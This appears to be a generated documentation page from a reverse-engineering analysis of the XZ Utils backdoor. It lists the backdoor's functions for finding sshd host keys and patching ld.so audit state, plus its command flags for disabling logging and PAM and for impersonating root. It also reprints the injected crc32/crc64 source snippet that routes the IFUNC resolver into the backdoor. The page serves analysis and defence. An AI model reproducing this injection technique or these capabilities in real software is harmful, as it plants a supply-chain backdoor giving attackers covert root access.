<tr class="memitem:a18543737f1eaf3cb1288d0c57c1f0a65"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a18543737f1eaf3cb1288d0c57c1f0a65">find_dl_naudit</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *dynamic_linker_elf, <a class="el" href="structelf__info.html">elf_info_t</a> *libcrypto_elf, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a18543737f1eaf3cb1288d0c57c1f0a65"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find __rtld_global_ro offsets required to modify ld.so's private struct audit_ifaces state.  <a href="xzre_8h.html#a18543737f1eaf3cb1288d0c57c1f0a65">More...</a><br /></td></tr>
<tr class="separator:a18543737f1eaf3cb1288d0c57c1f0a65"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2d980185c135b2dd9bc69c099ba60c25"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2d980185c135b2dd9bc69c099ba60c25">find_link_map_l_audit_any_plt</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data, ptrdiff_t libname_offset, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a2d980185c135b2dd9bc69c099ba60c25"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find struct link_map offset required to modify ld.so's private link_map::l_audit_any_plt state.  <a href="xzre_8h.html#a2d980185c135b2dd9bc69c099ba60c25">More...</a><br /></td></tr>
<tr class="separator:a2d980185c135b2dd9bc69c099ba60c25"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a82817ae0ac4e7e9a7ded04c0fa16ed9c"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a82817ae0ac4e7e9a7ded04c0fa16ed9c">find_link_map_l_audit_any_plt_bitmask</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data, <a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a> *search_ctx)</td></tr>
<tr class="memdesc:a82817ae0ac4e7e9a7ded04c0fa16ed9c"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find the bitmask required to modify ld.so's private link_map::l_audit_any_plt state.  <a href="xzre_8h.html#a82817ae0ac4e7e9a7ded04c0fa16ed9c">More...</a><br /></td></tr>
<tr class="separator:a82817ae0ac4e7e9a7ded04c0fa16ed9c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4302c868eefb917c26b5922f19889b45"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a4302c868eefb917c26b5922f19889b45">sshd_get_host_keys_address_via_xcalloc</a> (u8 *data_start, u8 *data_end, u8 *code_start, u8 *code_end, <a class="el" href="structstring__references.html">string_references_t</a> *string_refs, void **host_keys_out)</td></tr>
<tr class="memdesc:a4302c868eefb917c26b5922f19889b45"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the address of <code>sensitive_data.host_keys</code> in sshd by using XREF_xcalloc_zero_size in <code>xcalloc</code>  <a href="xzre_8h.html#a4302c868eefb917c26b5922f19889b45">More...</a><br /></td></tr>
<tr class="separator:a4302c868eefb917c26b5922f19889b45"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a52ef44e674339d73bef9c9e28c97ecb7"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a52ef44e674339d73bef9c9e28c97ecb7">sshd_get_host_keys_address_via_krb5ccname</a> (u8 *data_start, u8 *data_end, u8 *code_start, u8 *code_end, void **host_keys_out, <a class="el" href="structelf__info.html">elf_info_t</a> *elf)</td></tr>
<tr class="memdesc:a52ef44e674339d73bef9c9e28c97ecb7"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the address of <code>sensitive_data.host_keys</code> in sshd by using getenv( STR_KRB5CCNAME )  <a href="xzre_8h.html#a52ef44e674339d73bef9c9e28c97ecb7">More...</a><br /></td></tr>
<tr class="separator:a52ef44e674339d73bef9c9e28c97ecb7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5126a648eae68682ec767c19bba0f9eb"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5126a648eae68682ec767c19bba0f9eb">sshd_get_host_keys_score_in_demote_sensitive_data</a> (void *host_keys, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a5126a648eae68682ec767c19bba0f9eb"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if <code>demote_sensitive_data</code> accesses <code>host_keys</code> or not  <a href="xzre_8h.html#a5126a648eae68682ec767c19bba0f9eb">More...</a><br /></td></tr>
<tr class="separator:a5126a648eae68682ec767c19bba0f9eb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a72b20bf7b31873edf824778f9ecc471b"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a72b20bf7b31873edf824778f9ecc471b">sshd_get_host_keys_score_in_main</a> (void *host_keys, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a72b20bf7b31873edf824778f9ecc471b"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if <code>main</code> accesses <code>host_keys</code> or not  <a href="xzre_8h.html#a72b20bf7b31873edf824778f9ecc471b">More...</a><br /></td></tr>
<tr class="separator:a72b20bf7b31873edf824778f9ecc471b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4f33df6c2fc052bc282697241421337b"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a4f33df6c2fc052bc282697241421337b">sshd_get_host_keys_score_in_do_child</a> (void *host_keys, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a4f33df6c2fc052bc282697241421337b"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if <code>do_child</code> accesses <code>host_keys</code> or not  <a href="xzre_8h.html#a4f33df6c2fc052bc282697241421337b">More...</a><br /></td></tr>
<tr class="separator:a4f33df6c2fc052bc282697241421337b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac9f89faac5a24707275635026fa910b4"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ac9f89faac5a24707275635026fa910b4">sshd_get_host_keys_score</a> (void *host_keys, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:ac9f89faac5a24707275635026fa910b4"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if accesses <code>host_keys</code> or not  <a href="xzre_8h.html#ac9f89faac5a24707275635026fa910b4">More...</a><br /></td></tr>
<tr class="separator:ac9f89faac5a24707275635026fa910b4"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="var-members"></a>
Variables</h2></td></tr>
<tr class="memitem:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memItemLeft" align="right" valign="top">u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ab9c7b9765c15a48fbed3d1a8daf1b27f">resolver_call_count</a></td></tr>
<tr class="memdesc:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="mdescLeft">&#160;</td><td class="mdescRight">counts the number of times the IFUNC resolver is called  <a href="xzre_8h.html#ab9c7b9765c15a48fbed3d1a8daf1b27f">More...</a><br /></td></tr>
<tr class="separator:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aba335b5173c376997dd9e8686255413c"><td class="memItemLeft" align="right" valign="top"><a id="aba335b5173c376997dd9e8686255413c"></a>
<a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><b>global_ctx</b></td></tr>
<tr class="separator:aba335b5173c376997dd9e8686255413c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a32c97a88bc607d3f2459f0d7d420099d"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">hooks_data_addr</a></td></tr>
<tr class="memdesc:a32c97a88bc607d3f2459f0d7d420099d"><td class="mdescLeft">&#160;</td><td class="mdescRight">location of backdoor_hooks_data_t  <a href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">More...</a><br /></td></tr>
<tr class="separator:a32c97a88bc607d3f2459f0d7d420099d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="memItemLeft" align="right" valign="top">const ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">fake_lzma_allocator_offset</a></td></tr>
<tr class="memdesc:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains the offset to fake_lzma_allocator_struct  <a href="xzre_8h.html#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">More...</a><br /></td></tr>
<tr class="separator:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a654fa519cae913e8f1b0c5ad54f8cc3a"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a654fa519cae913e8f1b0c5ad54f8cc3a">fake_lzma_allocator</a></td></tr>
<tr class="memdesc:a654fa519cae913e8f1b0c5ad54f8cc3a"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains a fake lzma_allocator  <a href="xzre_8h.html#a654fa519cae913e8f1b0c5ad54f8cc3a">More...</a><br /></td></tr>
<tr class="separator:a654fa519cae913e8f1b0c5ad54f8cc3a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="memItemLeft" align="right" valign="top">const ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a4623e8d4254091bcbffbead1ee7ed2ff">elf_functions_offset</a></td></tr>
<tr class="memdesc:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains the offset to <a class="el" href="structelf__functions.html">elf_functions</a>  <a href="xzre_8h.html#a4623e8d4254091bcbffbead1ee7ed2ff">More...</a><br /></td></tr>
<tr class="separator:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a43a1216740525fdfa050474fc9b91a57"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structelf__functions.html">elf_functions_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a43a1216740525fdfa050474fc9b91a57">elf_functions</a></td></tr>
<tr class="memdesc:a43a1216740525fdfa050474fc9b91a57"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .data.rel.ro section that contains addresses to various functions  <a href="xzre_8h.html#a43a1216740525fdfa050474fc9b91a57">More...</a><br /></td></tr>
<tr class="separator:a43a1216740525fdfa050474fc9b91a57"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac7d6a45076bf21904bac3163ae57090e"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ac7d6a45076bf21904bac3163ae57090e">cpuid_random_symbol</a></td></tr>
<tr class="memdesc:ac7d6a45076bf21904bac3163ae57090e"><td class="mdescLeft">&#160;</td><td class="mdescRight">a bogus global variable that is used by the backdoor to generate an extra symbol  <a href="xzre_8h.html#ac7d6a45076bf21904bac3163ae57090e">More...</a><br /></td></tr>
<tr class="separator:ac7d6a45076bf21904bac3163ae57090e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3101b150fe0226a632314e2fa473aba1"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3101b150fe0226a632314e2fa473aba1">tls_get_addr_random_symbol</a></td></tr>
<tr class="memdesc:a3101b150fe0226a632314e2fa473aba1"><td class="mdescLeft">&#160;</td><td class="mdescRight">a bogus global variable that is used by the backdoor to generate an extra symbol  <a href="xzre_8h.html#a3101b150fe0226a632314e2fa473aba1">More...</a><br /></td></tr>
<tr class="separator:a3101b150fe0226a632314e2fa473aba1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ee0871d6d6f7544176777c8f00244b7"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6ee0871d6d6f7544176777c8f00244b7">cpuid_reloc_consts</a></td></tr>
<tr class="memdesc:a6ee0871d6d6f7544176777c8f00244b7"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .rodata section that contains _cpuid() related GOT offsets  <a href="xzre_8h.html#a6ee0871d6d6f7544176777c8f00244b7">More...</a><br /></td></tr>
<tr class="separator:a6ee0871d6d6f7544176777c8f00244b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aadd306e1b2b33d0306f1995e0a83dae7"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aadd306e1b2b33d0306f1995e0a83dae7">tls_get_addr_reloc_consts</a></td></tr>
<tr class="memdesc:aadd306e1b2b33d0306f1995e0a83dae7"><td class="mdescLeft">&#160;</td><td class="mdescRight">special .rodata section that contains __tls_get_addr() related GOT offsets  <a href="xzre_8h.html#aadd306e1b2b33d0306f1995e0a83dae7">More...</a><br /></td></tr>
<tr class="separator:aadd306e1b2b33d0306f1995e0a83dae7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8c67ac851c8ec7f40c406b286233f98e"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8c67ac851c8ec7f40c406b286233f98e">string_mask_data</a> [238]</td></tr>
<tr class="memdesc:a8c67ac851c8ec7f40c406b286233f98e"><td class="mdescLeft">&#160;</td><td class="mdescRight">contains mask data for the encoded string radix tree  <a href="xzre_8h.html#a8c67ac851c8ec7f40c406b286233f98e">More...</a><br /></td></tr>
<tr class="separator:a8c67ac851c8ec7f40c406b286233f98e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a53450f0faa9d81b24f8cee5731b51a58"><td class="memItemLeft" align="right" valign="top">const u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a53450f0faa9d81b24f8cee5731b51a58">string_action_data</a> [1304]</td></tr>
<tr class="memdesc:a53450f0faa9d81b24f8cee5731b51a58"><td class="mdescLeft">&#160;</td><td class="mdescRight">contains action data for the encoded string radix tree  <a href="xzre_8h.html#a53450f0faa9d81b24f8cee5731b51a58">More...</a><br /></td></tr>
<tr class="separator:a53450f0faa9d81b24f8cee5731b51a58"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<a name="details" id="details"></a><h2 class="groupheader">Detailed Description</h2>
<div class="textblock"><p>XZ backdoor structures and functions. </p>
<dl class="section author"><dt>Author</dt><dd>Stefano Moioli (<a href="#" onclick="location.href='mai'+'lto:'+'smx'+'de'+'v4@'+'gm'+'ail'+'.c'+'om'; return false;">smxde<span style="display: none;">.nosp@m.</span>v4@g<span style="display: none;">.nosp@m.</span>mail.<span style="display: none;">.nosp@m.</span>com</a>) </dd></dl>
</div><h2 class="groupheader">Typedef Documentation</h2>
<a id="a65ea88969746c06d6c0d0b1586f610db"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a65ea88969746c06d6c0d0b1586f610db">&#9670;&nbsp;</a></span>elf_handles_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structelf__handles.html">elf_handles</a> <a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>array of ELF handles </p>
<dl class="section see"><dt>See also</dt><dd>ElfId maps the indices </dd></dl>

</div>
</div>
<a id="a41b1410a6c3d2613895ce26896903600"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a41b1410a6c3d2613895ce26896903600">&#9670;&nbsp;</a></span>key_payload_hdr_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structkey__payload__hdr.html">key_payload_hdr</a> <a class="el" href="xzre_8h.html#a41b1410a6c3d2613895ce26896903600">key_payload_hdr_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the payload header. also used as Chacha IV </p>
<dl class="section return"><dt>Returns</dt><dd>typedef struct </dd></dl>

</div>
</div>
<a id="aaad9381e8f52552bbb914465c45bdac2"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aaad9381e8f52552bbb914465c45bdac2">&#9670;&nbsp;</a></span>key_payload_t</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef struct <a class="el" href="structkey__payload.html">key_payload</a> <a class="el" href="xzre_8h.html#aaad9381e8f52552bbb914465c45bdac2">key_payload_t</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the contents of the RSA 'n' field </p>
<dl class="section return"><dt>Returns</dt><dd>typedef struct </dd></dl>

</div>
</div>
<h2 class="groupheader">Enumeration Type Documentation</h2>
<a id="a5f8f63d8ae502ab76547c7b077cb067c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5f8f63d8ae502ab76547c7b077cb067c">&#9670;&nbsp;</a></span>CommandFlags1</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">enum <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067c">CommandFlags1</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<table class="fieldtable">
<tr><th colspan="2">Enumerator</th></tr><tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067caef08c4a90ed6e0457d25d2c229bd375a"></a>CMDF_8BYTES&#160;</td><td class="fielddoc"><p>the data block contains 8 additional bytes </p>
</td></tr>
<tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067ca3616e0158ba9d48631cbdf2f9ff3eb7e"></a>CMDF_SETLOGMASK&#160;</td><td class="fielddoc"><p>disable all logging by setting mask 0x80000000 </p>
</td></tr>
<tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067cac37705603ed342dbf4c076c037357891"></a>CMDF_DISABLE_PAM&#160;</td><td class="fielddoc"><p>if set, disables PAM authentication </p>
</td></tr>
</table>

</div>
</div>
<a id="a408b28a8a0686c2ba0ede1e1b4208348"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a408b28a8a0686c2ba0ede1e1b4208348">&#9670;&nbsp;</a></span>CommandFlags2</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">enum <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348">CommandFlags2</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<table class="fieldtable">
<tr><th colspan="2">Enumerator</th></tr><tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348ad62079a782b410d925454cf4c67cad43"></a>CMDF_IMPERSONATE&#160;</td><td class="fielddoc"><p>if set, impersonate a user (info from payload) if not set, impersonate root </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348a503e908611a2b460cac82b916acf3d68"></a>CMDF_CHANGE_MONITOR_REQ&#160;</td><td class="fielddoc"><p>if set, changes the <code>monitor_reqtype</code> field from <code>MONITOR_REQ_AUTHPASSWORD</code> to what's contained in the payload </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348ae700a962c8a6f21e7e4f6b1a461e0f71"></a>CMDF_CONTINUATION&#160;</td><td class="fielddoc"><p>more data available in the following packet not compatible with command 3 </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348a955fb3640af5b4d2852a6f2b869d9940"></a>CMDF_PSELECT&#160;</td><td class="fielddoc"><p>executes pselect, then exit not compatible with command 2 </p>
</td></tr>
</table>

</div>
</div>
<h2 class="groupheader">Function Documentation</h2>
<a id="a93ca9203c23a4ab6b11ad972e77d6d80"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a93ca9203c23a4ab6b11ad972e77d6d80">&#9670;&nbsp;</a></span>_cpuid_gcc()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void _cpuid_gcc </td>
          <td>(</td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>level</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>a</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>b</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>c</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>d</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>actually calls cpuid instruction </p>
<p>this is a copy of __cpuid() from gcc</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">level</td><td>EAX register input for cpuid instruction </td></tr>
    <tr><td class="paramname">a</td><td>EAX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">b</td><td>EBX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">c</td><td>ECX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">d</td><td>EDX register output for cpuid instruction </td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a954b1d109f7b7576c4d904a1ef5de2c9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a954b1d109f7b7576c4d904a1ef5de2c9">&#9670;&nbsp;</a></span>_get_cpuid_modified()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">unsigned int _get_cpuid_modified </td>
          <td>(</td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>leaf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>eax</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>ebx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>ecx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>edx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64() </p>
<p>calls <a class="el" href="xzre_8h.html#a247a9d52e67096a060b99f0eb6dd4ca6" title="calls backdoor_init_stage2 by disguising it as a call to cpuid.">backdoor_init()</a></p>
<p>this is a copy of __get_cpuid() from gcc</p>
<p>for context this is the extra code the backdoor build inserts into both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c </p><div class="fragment"><div class="line"><span class="preprocessor">#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))</span></div>
<div class="line"><span class="keywordtype">int</span> _get_cpuid(<span class="keywordtype">int</span>, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*);</div>
<div class="line"> </div>
<div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keywordtype">bool</span> _is_arch_extension_supported(<span class="keywordtype">void</span>) {</div>
<div class="line">  <span class="keywordtype">int</span> success = 1;</div>
<div class="line">  uint32_t r[4];</div>
<div class="line">  success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((<span class="keywordtype">char</span>*) __builtin_frame_address(0))-16);</div>
<div class="line">  <span class="keyword">const</span> uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);</div>
<div class="line">  <span class="keywordflow">return</span> success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask;</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line"><span class="preprocessor">#else</span></div>
<div class="line"><span class="preprocessor">#define _is_arch_extension_supported() is_arch_extension_supported</span></div>
<div class="line"><span class="preprocessor">#endif </span></div>
</div><!-- fragment --><p>the _get_cpuid() function is defined in the file liblzma_la-crc64-fast.o which is linked into liblzma to bring in the backdoor's code</p>
<p>the _is_arch_extension_supported is a modified version of is_arch_extension_supported() from xz/src/liblzma/check/crc_x86_clmul.h</p>
<p>additionally both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c are modified to replace the call to is_arch_extension_supported() with _is_arch_extension_supported()</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">leaf</td><td>EAX register input for cpuid instruction </td></tr>
    <tr><td class="paramname">eax</td><td>EAX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">ebx</td><td>EBX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">ecx</td><td>ECX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">edx</td><td>EDX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if cpuid leaf supported, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a851b6ae19abb6961d0c6c21f382e0abc"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a851b6ae19abb6961d0c6c21f382e0abc">&#9670;&nbsp;</a></span>backdoor_entry()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">unsigned int backdoor_entry </td>
          <td>(</td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>cpuid_request</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <a class="el" href="xzre_8h.html#a247a9d52e67096a060b99f0eb6dd4ca6">backdoor_init</a> while in the crc64() IFUNC resolver function </p>
<p>the function counts the number of times it was called in resolver_call_count</p>
<p>the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level</p>
<p>the second time it is called is in the crc64() resolver and then this function calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a></p>
